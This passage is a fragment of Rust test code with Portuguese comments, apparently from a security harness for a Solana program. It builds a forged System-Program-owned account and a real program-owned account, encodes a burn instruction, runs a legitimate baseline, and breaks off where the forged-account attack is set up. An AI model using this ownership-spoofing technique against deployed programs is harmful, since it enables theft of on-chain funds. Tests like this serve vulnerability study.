forged_data[40..48].copy_from_slice(&1000u64.to_le_bytes());
forged_data[48..56].copy_from_slice(&500u64.to_le_bytes());
let forged_account = account(&solana_sdk::system_program::id(), &forged_data, None);

// Conta real do programa, que sera gravada
let mut real_data = vec![0u8; 56];
real_data[40..48].copy_from_slice(&1000u64.to_le_bytes());
real_data[48..56].copy_from_slice(&500u64.to_le_bytes());
let real_account = account(&program_id, &real_data, None);

let amount: u64 = 100;
let mut ix_data = Vec::new();
ix_data.push(3u8);
ix_data.extend_from_slice(&amount.to_le_bytes());

// Baseline: ledger legitimo (owner = programa)
let metas_baseline: Vec<AccountMeta> = vec![AccountMeta::new(real_key, false)];
let ix_baseline = env.raw_ix(&ix_data, metas_baseline);
let contas_baseline = vec![(real_key, real_account.clone())];
let _r_base = env.baseline("burn legitimo sobre conta do programa", &ix_baseline, &contas_baseline);

// Ataque: accounts[0] e a conta forjada (owner = System Program), accounts[1] e a conta real do programa
